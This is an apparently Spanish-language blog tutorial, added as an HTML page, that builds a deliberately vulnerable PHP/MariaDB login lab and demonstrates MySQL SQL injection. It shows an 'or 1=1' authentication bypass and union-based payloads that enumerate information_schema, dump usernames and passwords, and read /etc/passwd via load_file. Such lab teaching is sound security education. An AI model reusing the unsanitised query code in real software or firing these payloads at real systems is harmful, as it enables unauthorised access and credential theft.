@@ -1,0 +1,339 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>SQL Injection MySQL</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://avatars.githubusercontent.com/u/95899548?v=4">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="SQL Injection MySQL" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Explotación de SQL Injection en mysql" />
+<meta property="og:description" content="Explotación de SQL Injection en mysql" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="SQL Injection MySQL" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="SQL Injection MySQL" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Explotación de SQL Injection en mysql","headline":"Explotación de SQL Injection en mysql","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>SQL Injection MySQL</h1>
+          <p>Explotación de SQL Injection en mysql</p>
+        </div>
+
+ <div><strong><h3>Preparación</h3></strong></div><br>
+
+<div><p>Necesitamos crear un entorno vulnerable en mi caso usare docker, instalamos algunas cosas</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">root@0bf02e8d0adf</span><span class="p">:</span><span class="na">~</span><span class="p"># apt install apache2 mariadb-server php php-mysql</span>
+</code></pre></div></div><br>
+
+<div><p>Una vez instalados habilitamos el servicio apache2 para la web y mariadb para mysql</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">root@0bf02e8d0adf</span><span class="p">:</span><span class="na">~</span><span class="p"># service apache2 start
+[ </span><span class="s2">ok</span><span class="p"> ] Starting Apache httpd web server: apache2.
+</span><span class="s2">root@0bf02e8d0adf</span><span class="p">:</span><span class="na">~</span><span class="p"># service mariadb start
+[ </span><span class="s2">ok</span><span class="p"> ] Starting MariaDB database server: mariadb.
+</span><span class="s2">root@0bf02e8d0adf</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
+</code></pre></div></div><br>
+
+<div><p>Nos conectaremos a mysql y crearemos una base de datos que usaremos como ejemplo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">root@0bf02e8d0adf</span><span class="p">:</span><span class="na">~</span><span class="p"># mariadb
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+</span><span class="kd">MariaDB [(none)]></span><span class="p"> CREATE DATABASE example;
+Query OK, 1 row affected (0.001 sec)
+
+</span><span class="kd">MariaDB [(none)]></span><span class="p"> USE example;
+Database changed
+
+</span><span class="kd">MariaDB [example]></span>
+</code></pre></div></div><br>
+
+<div><p>En ella crearemos una tabla users con las columnas id, role, username y password</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">MariaDB [example]></span><span class="p"> CREATE TABLE users (id int, role varchar(255), username varchar(255), password varchar(255));
+Query OK, 0 rows affected (0.020 sec)</span>
+</code></pre></div></div><br>
+
+<div><p>Ahora insertaremos multiples valores en cada uno de los campos de las columnas existentes</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">MariaDB [example]></span><span class="p"> INSERT INTO users (id, role, username, password) VALUES (1, "Noob", "GatoGamer1155", "gatogamer123!");
+Query OK, 1 row affected (0.009 sec)
+
+</span><span class="kd">MariaDB [example]></span><span class="p"> INSERT INTO users (id, role, username, password) VALUES (2, "Hacker", "0bfxgh0st", "ghost1337!");
+Query OK, 1 row affected (0.005 sec)
+
+</span><span class="kd">MariaDB [example]></span><span class="p"> INSERT INTO users (id, role, username, password) VALUES (3, "Hacker", "EddieDota", "alvarovazques69!");
+Query OK, 1 row affected (0.005 sec)
+
+</span><span class="kd">MariaDB [example]></span><span class="p"> INSERT INTO users (id, role, username, password) VALUES (4, "Pro Hacker", "Txhaka", "password123");
+Query OK, 1 row affected (0.013 sec)
+
+</span><span class="kd">MariaDB [example]></span><span class="p"> INSERT INTO users (id, role, username, password) VALUES (5, "Elite Hacker", "Pascualropi", "vulnwhatsapp413");
+Query OK, 1 row affected (0.004 sec)
+
+</span><span class="kd">MariaDB [example]></span><span class="p"> SELECT * FROM users;
++------+--------------+---------------+------------------+
+| id   | role         | username      | password         |
++------+--------------+---------------+------------------+
+|    1 | Noob         | GatoGamer1155 | gatogamer123!    |
+|    2 | Hacker       | 0bfxgh0st     | ghost1337!       |
+|    3 | Hacker       | EddieDota     | alvarovazques69! |
+|    4 | Pro Hacker   | Txhaka        | password123      |
+|    5 | Elite Hacker | Pascualropi   | vulnwhatsapp413  |
++------+--------------+---------------+------------------+
+5 rows in set (0.001 sec)
+
+</span><span class="kd">MariaDB [example]></span>
+</code></pre></div></div><br>
+
+<div><p>Finalmente creamos un usuario y le otorgaremos acceso a la base de datos example</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">MariaDB [example]></span><span class="p"> CREATE USER 'user'@localhost IDENTIFIED BY 'password';
+Query OK, 0 rows affected (0.007 sec)
+
+</span><span class="kd">MariaDB [example]></span><span class="p"> GRANT ALL ON example.* TO 'user'@localhost IDENTIFIED BY 'password';
+Query OK, 0 rows affected (0.003 sec)
+
+</span><span class="kd">MariaDB [example]></span>
+</code></pre></div></div><br>
+
+<div><p>Ahora crearemos un par de scripts para la web, y los depositaremos en /var/www/html</p></div>
+<li>login.php</li><br>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">&lt!</span><span class="kd">DOCTYPE</span><span class="na"> html</span><span class="p">>
+&lt</span><span class="kd">html</span><span class="p">>
+  &lt</span><span class="kd">head</span><span class="p">>
+    &lt</span><span class="kd">title</span><span class="p">>Login Panel&lt/</span><span class="kd">title</span><span class="p">>
+  &lt/</span><span class="kd">head</span><span class="p">>
+  &lt</span><span class="kd">body</span><span class="p">>
+    &lt</span><span class="kd">form </span><span class="k">action=</span><span class="s2">"panel.php" </span><span class="k">method=</span><span class="s2">"post"</span><span class="p">>
+      &lt</span><span class="kd">label </span><span class="k">for=</span><span class="s2">"username"</span><span class="p">>Username:&lt/</span><span class="kd">label</span><span class="p">>
+      &lt</span><span class="kd">input </span><span class="k">type=</span><span class="s2">"text" </span><span class="k">id=</span><span class="s2">"username" </span><span class="k">name=</span><span class="s2">"username"</span><span class="p">>
+      &lt</span><span class="kd">br</span><span class="p">>
+      &lt</span><span class="kd">label </span><span class="k">for=</span><span class="s2">"password"</span><span class="p">>Password:&lt/</span><span class="kd">label</span><span class="p">>
+      &lt</span><span class="kd">input </span><span class="k">type=</span><span class="s2">"password" </span><span class="k">id=</span><span class="s2">"password" </span><span class="k">name=</span><span class="s2">"password"</span><span class="p">>
+      &lt</span><span class="kd">br</span><span class="p">>&lt</span><span class="kd">br</span><span class="p">>
+      &lt</span><span class="kd">input </span><span class="k">type=</span><span class="s2">"submit" </span><span class="k">value=</span><span class="s2">"Login"</span><span class="p">>
+    &lt/</span><span class="kd">form</span><span class="p">>
+  &lt/</span><span class="kd">body</span><span class="p">>
+&lt/</span><span class="kd">html</span><span class="p">></span>
+</code></pre></div></div>
+
+<li>panel.php</li><br>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">&lt?php
+
+$dbhostname </span><span class="kd">=</span><span class="s2"> 'localhost'</span><span class="p">;
+$dbuser </span><span class="kd">=</span><span class="s2"> 'user'</span><span class="p">;
+$dbpassword </span><span class="kd">=</span><span class="s2"> 'password'</span><span class="p">;
+$dbname </span><span class="kd">=</span><span class="s2"> 'example'</span><span class="p">;
+
+$connection </span><span class="kd">=</span><span class="k"> mysqli_connect</span><span class="p">($dbhostname, $dbuser, $dbpassword, $dbname);
+
+$username </span><span class="kd">=</span><span class="p"> $_POST[</span><span class="s2">"username"</span><span class="p">];
+$password </span><span class="kd">=</span><span class="p"> $_POST[</span><span class="s2">"password"</span><span class="p">];
+
+$query </span><span class="kd">=</span><span class="s2"> "SELECT * FROM users WHERE username='$username' AND password='$password'"</span><span class="p">;
+$result </span><span class="kd">=</span><span class="k"> mysqli_query</span><span class="p">($connection, $query);
+
+</span><span class="kd">if</span><span class="p"> (</span><span class="j">mysqli_num_rows</span><span class="p">($result) </span><span class="kd">></span><span class="na"> 0</span><span class="p">) {
+    </span><span class="k">session_start</span><span class="p">();
+    $_SESSION[</span><span class="s2">"loggedin"</span><span class="p">] </span><span class="kd">=</span><span class="na"> true</span><span class="p">;
+    </span><span class="k">header</span><span class="p">(</span><span class="s2">"Location: example.php"</span><span class="p">);
+}
+</span><span class="kd">else</span><span class="p"> {
+    </span><span class="k">echo </span><span class="s2">"The Username or Password is Incorrect"</span><span class="p">;
+}
+?></span>
+</code></pre></div></div>
+
+<li>example.php</li><br>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">&lt!</span><span class="kd">DOCTYPE </span><span class="na">html</span><span class="p">>
+&lt</span><span class="kd">html</span><span class="p">>
+  &lt</span><span class="kd">head</span><span class="p">>
+    &lt</span><span class="kd">title</span><span class="p">>Information users&lt/</span><span class="kd">title</span><span class="p">>
+  &lt/</span><span class="kd">head</span><span class="p">>
+  &lt</span><span class="kd">body</span><span class="p">>
+  &lt</span><span class="kd">form </span><span class="k">action=</span><span class="s2">"example.php"</span><span class="k"> method=</span><span class="s2">"get"</span><span class="p">>
+    &lt</span><span class="kd">label </span><span class="k">for=</span><span class="s2">"id"</span><span class="p">>User id:&lt/</span><span class="kd">label</span><span class="p">>
+    &lt</span><span class="kd">input </span><span class="k">type=</span><span class="s2">"text"</span><span class="k"> id=</span><span class="s2">"id"</span><span class="k"> name=</span><span class="s2">"id"</span><span class="p">>
+    &lt</span><span class="kd">input </span><span class="k">type=</span><span class="s2">"submit"</span><span class="k"> value=</span><span class="s2">"Send"</span><span class="p">>
+  &lt/</span><span class="kd">form</span><span class="p">>
+  &lt/</span><span class="kd">body</span><span class="p">>
+&lt/</span><span class="kd">html</span><span class="p">>
+
+&lt?php
+
+$dbhostname </span><span class="kd">=</span><span class="s2"> 'localhost'</span><span class="p">;
+$dbuser </span><span class="kd">= </span><span class="s2">'user'</span><span class="p">;
+$dbpassword </span><span class="kd">=</span><span class="s2"> 'password'</span><span class="p">;
+$dbname </span><span class="kd">=</span><span class="s2"> 'example'</span><span class="p">;
+
+$connection </span><span class="kd">=</span><span class="k"> mysqli_connect</span><span class="p">($dbhostname, $dbuser, $dbpassword, $dbname);
+
+$input </span><span class="kd">=</span><span class="p"> $_GET[</span><span class="s2">'id'</span><span class="p">];
+
+$query </span><span class="kd">=</span><span class="s2"> "SELECT id, role, username FROM users WHERE id='$input'"</span><span class="p">;
+
+$results </span><span class="kd">=</span><span class="k"> mysqli_query</span><span class="p">($connection, $query);
+
+</span><span class="kd">while</span><span class="p"> ($rows </span><span class="kd">=</span><span class="k"> mysqli_fetch_assoc</span><span class="p">($results)) {
+    </span><span class="kd">echo</span><span class="s2"> "&lttable>"</span><span class="p">;
+    </span><span class="kd">echo</span><span class="s2"> "&lttr>"</span><span class="p">;
+    </span><span class="kd">echo</span><span class="s2"> "&ltth align='center'>id&lt/th>"</span><span class="p">;
+    </span><span class="kd">echo</span><span class="s2"> "&ltth align='center'>role&lt/th>"</span><span class="p">;
+    </span><span class="kd">echo</span><span class="s2"> "&ltth align='center'>username&lt/th>"</span><span class="p">;
+    </span><span class="kd">echo</span><span class="s2"> "&lt/tr>"</span><span class="p">;
+    </span><span class="kd">echo</span><span class="s2"> "&lttr>"</span><span class="p">;
+    </span><span class="kd">echo</span><span class="s2"> "&lttd align='center'> " </span><span class="kd">.</span><span class="p"> $rows[</span><span class="s2">'id'</span><span class="p">]</span><span class="kd"> . </span><span class="s2">"&lt/td>"</span><span class="p">;
+    </span><span class="kd">echo</span><span class="s2"> "&lttd align='center'> " </span><span class="kd">.</span><span class="p"> $rows[</span><span class="s2">'role'</span><span class="p">]</span><span class="kd"> .</span><span class="s2"> "&lt/td>"</span><span class="p">;
+    </span><span class="kd">echo</span><span class="s2"> "&lttd align='center'> " </span><span class="kd">.</span><span class="p"> $rows[</span><span class="s2">'username'</span><span class="p">]</span><span class="kd"> . </span><span class="s2">"&lt/td>"</span><span class="p">;
+    </span><span class="kd">echo</span><span class="s2"> "&lt/tr>"</span><span class="p">;
+    </span><span class="kd">echo</span><span class="s2"> "&lt/table>"</span><span class="p">;
+}
+
+?></span>
+</code></pre></div></div><br>
+
+<div><strong><h3>Authentication Bypass</h3></strong></div><br>
+
+<div><p>Tenemos los archivos y estamos corriendo el servicio, veamos el login.php</p></div>
+<div><p><img src="./1.png"></p></div>
+
+<div><p>Si enviamos un usuario y contraseña como user y pass, nos dice que es incorrecto</p></div>
+<div><p><img src="./2.png"></p></div>
+<div><p><img src="./3.png"></p></div><br>
+
+<div><p>La query compara la data que pasamos con algun usuario y contraseña de la base de datos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">SELECT * FROM users WHERE username='$username' AND password='$password'";</span>
+</code></pre></div></div><br>
+
+<div><p>Si no conocemos credenciales existentes en la db es imposible entrar .... ¿o no?</p></div>
+<div><p>Con una query como la siguiente como user y cualquier cosa como contraseña nos loguea</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">'or 1=1-- -</span>
+</code></pre></div></div>
+<div><p><img src="./4.png"></p></div>
+<div><p><img src="./5.png"></p></div><br>
+
+<blockquote><strong><div><p>¿Que hace '-- -' exactamente?</p></div></strong>
+<div><p>Lo que hace es comentar lo que sigue de la query sql para que no se ejecute, tambien se puede usar # dependiendo la situación</p></div></blockquote><br>
+
+<div><p>Pero ¿porque?, al enviar eso como query sobreescribe el campo user en la query y quedaria asi</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">SELECT * FROM users WHERE username=''or 1=1-- -</span><span class="c1">' AND password='pass'";</span>
+</code></pre></div></div>
+
+<div><p>Cierra la query con ' pero no hay un usuario sin contenido, para eso sirve or 1=1, si el usuario es incorrecto comparará que 1 sea igual a 1 cuando haga eso dará la query como correcta</p></div><br>
+
+<div><strong><h3>SQL Injection Union Based</h3></strong></div><br>
+<div><p>Una vez autenticados nos redirige a example.php que tiene un campo de user id</p></div>
+<div><p><img src="./5.png"></p></div><br>
+
+<div><p>Enviamos algun posible id válido por ejemplo 1 y nos muestra la información del usuario</p></div>
+<div><p><img src="./6.png"></p></div><br>
+
+<div><p>El id se maneja en un parametro por GET, si lo cambiamos por 2 nos muestra otra información</p></div>
+<div><p><img src="./7.png"></p></div><br>
+
+<div><p>Podemos aplicar un ordenamiendo de datos probando con la columna 4 y nos deja de mostrar info</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">1'order by 4-- -</span>
+</code></pre></div></div>
+<div><p><img src="./8.png"></p></div><br>
+
+<div><p>Probamos con 3 columnas y nos muestra nuevamente asi que existen solo 3 columnas</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">1'order by 3-- -</span>
+</code></pre></div></div>
+<div><p><img src="./9.png"></p></div><br>
+
+<div><p>En este punto podemos empezar a jugar con union select para representar 3 campos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">1'union select 1,2,3-- -</span>
+</code></pre></div></div>
+<div><p><img src="./10.png"></p></div><br>
+
+<div><p>Usaremos el campo 2 para ver el nombre de la base de datos en uso, que se llama example</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">1'union select 1,database(),3-- -</span>
+</code></pre></div></div>
+<a href="./11.png" target="_blank"><div><p><img src="./11.png"><p></div></a><br>
+
+<div><p>Ahora pasaremos la query para enumerar las bases de datos, nos muestra 2 una en cada linea</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">1'union select 1,schema_name,3 from information_schema.schemata-- -</span>
+</code></pre></div></div>
+<a href="./12.png" target="_blank"><div><p><img src="./12.png"><p></div></a><br>
+
+<div><p>Podemos usar group_concat para verlas en una sola linea separado por comas</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">1'union select 1,group_concat(schema_name),3 from information_schema.schemata-- -</span>
+</code></pre></div></div>
+<a href="./13.png" target="_blank"><div><p><img src="./13.png"><p></div></a><br>
+
+<div><p>Ahora que sabemos las db enumeramos las tablas existentes en example, solo vemos users</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='example'-- -</span>
+</code></pre></div></div>
+<a href="./14.png" target="_blank"><div><p><img src="./14.png"><p></div></a><br>
+
+<div><p>Conocemos la tabla users asi que enumeramos sus columnas, (id, role, username y password)</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">1'union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='example' and table_name='users'-- -</span>
+</code></pre></div></div>
+<a href="./15.png" target="_blank"><div><p><img src="./15.png"><p></div></a><br>
+
+<div><p>En caso que nos hubiera dado problemas especificar table_schema o table_name podemos representarlo en hexadecimal y tambien deberia funcionar</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">1'union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=0x6578616d706c65 and table_name=0x7573657273-- -</span>
+</code></pre></div></div>
+<a href="./16.png" target="_blank"><div><p><img src="./16.png"><p></div></a><br>
+
+<div><p>Solos nos interesan las columnas username y password de la tabla users de la base de datos example, podemos hacer una query para leerlos, separandolos por 0x3a (:) en hexadecimal</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">1'union select 1,group_concat(username,0x3a,password),3 from example.users-- -</span>
+</code></pre></div></div>
+<a href="./17.png" target="_blank"><div><p><img src="./17.png"><p></div></a><br>
+
+<div><p>De esta manera enumeramos la db, pero hay otras funciones como load_file que nos permiten leer archivos en este caso el /etc/passwd</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">1'union select 1,load_file("/etc/passwd"),3-- -</span>
+</code></pre></div></div>
+<a href="./18.png" target="_blank"><div><p><img src="./18.png"><p></div></a><br>
+
+<blockquote><strong><div><p>¡Proximamente!</p></div></strong>
+<div><p>En cuanto tenga un poco mas de tiempo actualizaré el post agregando otros tipos de inyecciones sql basadas en error, boolean y tiempo</p></div></blockquote><br>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+    </div>
+  </body>
+</html>
